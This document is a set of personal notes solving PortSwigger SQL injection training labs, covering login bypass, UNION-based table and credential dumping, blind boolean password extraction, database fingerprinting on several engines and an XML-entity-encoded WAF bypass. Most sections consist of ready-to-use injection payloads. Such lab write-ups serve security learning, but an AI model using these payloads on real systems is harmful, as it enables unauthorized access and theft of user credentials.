# SQL Injection labs

Usually appears in `WHERE` clause of a `SELECT` query, can appear in others like:
- In `UPDATE` statements, within the updated values or the `WHERE` clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER` BY clause


**Cheatsheet**

https://portswigger.net/web-security/sql-injection/cheat-sheet

- Use `'` as the input and look for errors or anomalies
- Boolean conditions like `OR 1=1` and `OR 1=2`
- Payloads deisgned to trigger time delays, look for response time differences
- OAST payloads

Comments:

| Comment string | Database |
|----------------|----------|
| `--comment` | Oracle, PostgreSQL, MSSQL |
| `/* comment */` | PostgreSQL, MSSQL, MySQL |
| `#comment` | MySQL |
| `-- comment` | MySQL |


## Retrieving hidden data

**Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

Basic web store frontend, filters products based on id and category

Product id doesn't appear to be injectable, attempts fail with "Invalid product ID"

Category does appear to be injectable, using `'` as the input causes an internal server error

Use GET request to `/filter?category=` to inject SQL

The following payloads work:

```
# Can be destructive if UPDATE or DELETE are used
/filter?category='+OR+1=1--
/filter?category='+OR+True--

# Requires knowledge of the column name
/filter?category='+AND+released=0--
```

## Subverting application logic

**Lab: SQL injection vulnerability allowing login bypass**

Basic web store page, login path at `/login`

POST request form parameters are `csrf`, `username` and `password`

Username parameter is injectable and authentication can be bypassed with `administrator'--` as the username and any password

## Retrieving data from other database tables (UNION attacks)

Use `UNION` to pull data from other tables i.e.

`' UNION SELECT * FROM users--`

More info on union attacks: https://portswigger.net/web-security/sql-injection/union-attacks

For a UNION query to work:

- the individual queries must return the same number of columns
- the data types in each column must be compatible between the queries

### Determining the number of columns required

Use an ORDER BY clause:

```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
--etc.
```

If the index specified is higher than the number of columns the database will return an error

Using UNION SELECT with dummy values:

```sql
--With NULL (convertible to every common data type)
UNION SELECT NULL--
UNION SELECT NULL,NULL--
--etc.
```

**Lab: SQL injection UNION attack, determining the number of columns returned by the query**

Injection vulnerability in the product category filter, use a UNION to determine the required number of columns to return

Inject a UNION into the category query string:

```
'+UNION+SELECT+NULL,NULL--
```

### Finding columns with a useful data type

Determine if a column is a string by replacing the NULL in each index with a dummy string:

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

**Lab: SQL injection UNION attack, finding a column containing text**

Injection vulnerability in the product category filter, use a UNION attack to identify columns that contain string data

```
'+UNION+SELECT+'string to retrieve',NULL,NULL--
'+UNION+SELECT+NULL,'string to retrieve',NULL--
'+UNION+SELECT+NULL,NULL,'string to retrieve'--
```

### Using a SQL injection UNION attack to retrieve interesting data

**Lab: SQL injection UNION attack, retrieving data from other tables**

Injection vulnerability in the product category filter, use a UNION attack to retrieve data from other tables

We're given the users table name but if we weren't we can do this:

```sql
--Find out how many columns we need
UNION SELECT NULL,NULL--
--Dump table names
UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
--Dump column names
UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE TABLE_NAME='user table name'--
--Dump data we want
UNION SELECT username,password FROM users--
```

### Retrieving multiple values within a single column

When we need to retrieve multiple values but only have a single column we can work with we can use string concatenation

| Database | Syntax |
|----------|--------|
| Oracle | `'foo'||'bar'` |
| Microsoft | `'foo'+'bar'` |
| PostgreSQL | `'foo'||'bar'` |
| MySQL | `'foo' 'bar'`, `CONCAT('foo','bar')` |

**Lab: SQL injection UNION attack, retrieving multiple values in a single column**

Injection vulnerability in the product category filter, use a UNION attack to retrieve username and password values in one column

Determine number of columns:

```
'+UNION+SELECT+NULL,NULL--
```

Determine column holding string data:

```
'+UNION+SELECT+'a',NULL--
'+UNION+SELECT+NULL,'a'--
```

Concatenate and dump username and passwords:

```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

## Blind SQl injection vulnerabilities

The application returns no results from the query, use the following:

- Change the query to trigger a difference in the app's response
- Trigger a time delay
- Trigger out-of-band network interaction using OAST techniques

More info: https://portswigger.net/web-security/sql-injection/blind

### Exploiting blind SQL injection by triggering conditional responses

**Lab: Blind SQL injection with conditional responses**

Tracking cookie is injectable, server returns a Welcome Back message if the query returns any rows. Exploit the blind SQLi vulnerability to find the administrator password

Confirm injection:

```
# %3d is `=` URL encoded
tracking_cookie_value'+AND+'1'%3d'1
```

The page shows the "Welcome back!" banner

Find first letter of the administrator password (only lowercase aphanumeric characters):

```
# Use > and < to find the first character
tracking_cookie_value'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),1,1)+>+'m
tracking_cookie_value'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),1,1)+>+'5
# Use >= and <= too
tracking_cookie_value'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),1,1)+>%3d+'0
# Use = to confirm the value is correct
tracking_cookie_value'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),1,1)+%3d+'0
# Repeat the process by increasing the index in the SUBSTRING function to find the second character
tracking_cookie_value'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),2,1)+>+'m
# Repeat ad nauseum
```

### Error-based SQL injection

## Second-order SQL injection AKA Stored SQL injection

Use stored values like user names to trigger an injection when the values are retrieved from the database and used in subsequent queries

## Examining the database

### Querying the database type and version

After identifying a SQLi we can use queries to enumerate the database

More info: https://portswigger.net/web-security/sql-injection/examining-the-database

| Database type | Query |
|---------------|-------|
| Microsoft, MySQL | SELECT @@version |
| Oracle | SELECT * FROM v$version |
| PostgreSQL | SELECT version() |

**Lab: SQL injection attack, querying the database type and version on Oracle**

Injection vulnerability in the product category filter, use a UNION to get the database version

Confirm injection and determine how many columns our UNION query needs to return using dummy values and the built-in table `dual`

```sql
UNION SELECT 'a' FROM dual--
UNION SELECT 'a', 'b' FROM dual--
UNION SELECT 'a', 'b', 'c' FROM dual--
```

Dump the version

```sql
UNION SELECT BANNER,NULL FROM v$version--
```

**Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft**

**Comments need to have a trailing space if using --**

Injection vulnerability in the product category filter, use a UNION to get the database version

Determine how many columns we need using NULL values

```
# Using -- comments (MySQL)
'+UNION+SELECT+NULL--+
'+UNION+SELECT+NULL,NULL--+

# Using # comments (MySQL)
'+UNION+SELECT+NULL#
'+UNION+SELECT+NULL,NULL#

# Using --comments (MSSQL, Oracle, PostgreSQL)
'+UNION+SELECT+NULL--
'+UNION+SELECT+NULL,NULL--
```

Get the version number

```
'+UNION+SELECT+@@version,NULL--+
```

### Listing the contents of the database

Query the information_schema to get information about the database (except Oracle)

```sql
-- Query tables
SELECT * FROM information_schema.tables;
-- Query columns of a table
SELECT * FROM information_schema.columns WHERE table_name = 'TableName'
```

For Oracle databases use all_tables

```sql
--Query tables
SELECT * FROM all_tables
--Query columns of a table
SELECT * FROM all_tab_columns WHERE table_name = 'TABLENAME'
```

**Lab: SQL injection attack, listing the database contents on non-Oracle databases**

SQL injection vulnerability in the product category filter, use a UNION attack to retrieve the `administrator` password and log in

Determine what comment string to use and how many columns we need to return using dummy values:

```
--MSSQL, Oracle, PostgreSQL
'+UNION+SELECT+NULL--

-- MySQL
'+UNION+SELECT+NULL--+
'+UNION+SELECT+NULL#
```

Dump table names:

```
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+
```

Find the user table and pull the columns:

```
'+UNION+SELECT+COLUMN_NAME,DATA_TYPE+FROM+information_schema.columns+WHERE+table_name+=+'user_table_name'--+
```

Dump the user table:

```
'+UNION+SELECT+username_column,password_column+FROM+user_table_name--+
```

**Lab: SQL injection attack, listing the database contents on Oracle**

SQL injection vulnerability in the product category filter, use a UNION attack to retrieve the `administrator` password and log in

Determine how many columns we need to return using dummy values and `dual` table:

```
'+UNION+SELECT+NULL+FROM+dual--
```

Dump table names:

```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

Dump user table columns:

```
'+UNION+SELECT+COLUMN_NAME,DATA_TYPE+FROM+all_tab_columns+WHERE+table_name+=+'USER_TABLE_NAME'--
```

Dump the user table:

```
'+UNION+SELECT+USERNAME_COLUMN,PASSWORD_COLUMN+FROM+USER_TABLE_NAME--
```

## SQL injection in different contexts

**Lab: SQL injection with filter bypass via XML encoding**

Basic web store, products have a stock check feature that allows the user to check the stock number in various locations.

The stock checker sends an XML payload in a POST request to /product/stock

Stock check payload is injectable, we can test this by adding or subtracting from the storeId or productId

When we try to UNION the users table we get blocked by the WAF

We can bypass the WAF by using Unicode character encodings for the following query appended to the storeId or productId to retrieve the username and password

```sql
1 UNION SELECT username, password FROM users
```

This doesn't work as the web app expects a single column, so we need to use column concatenation to retrieve the username and password as a single column

```sql
1 UNION SELECT username || '~' || password FROM users 
```

Encoded:

```
&#x31;&#x20;&#x55;&#x4E;&#x49;&#x4F;&#x4E;&#x20;&#x53;&#x45;&#x4C;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6E;&#x61;&#x6D;&#x65;&#x20;&#x7C;&#x7C;&#x20;&#x27;&#x7E;&#x27;&#x20;&#x7C;&#x7C;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4F;&#x4D;&#x20;&#x55;&#x53;&#x45;&#x52;&#x53;
```
